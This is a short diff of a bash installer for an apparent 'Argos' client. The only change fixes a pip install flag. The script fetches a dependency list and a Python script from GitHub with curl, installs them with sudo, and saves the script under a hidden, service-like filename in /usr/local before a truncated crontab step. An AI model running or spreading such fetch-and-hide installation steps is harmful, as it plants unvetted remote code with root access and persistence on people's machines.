@@ -1,7 +1,7 @@
 #!/bin/bash
 urlbase=https://raw.githubusercontent.com/Just1truc
 # installing pip dependencies
-curl $urlbase/Argos/main/client/dependencies -o here && sudo pip install here && rm here
+curl $urlbase/Argos/main/client/dependencies -o here && sudo pip install -r here && rm here
 # installing script
 curl $urlbase/Argos/main/client/connexion.py -o .service.exwrap.py && sudo mv .service.exwrap.py /usr/local/.service.exwrap.py 
 # Setting up crontab
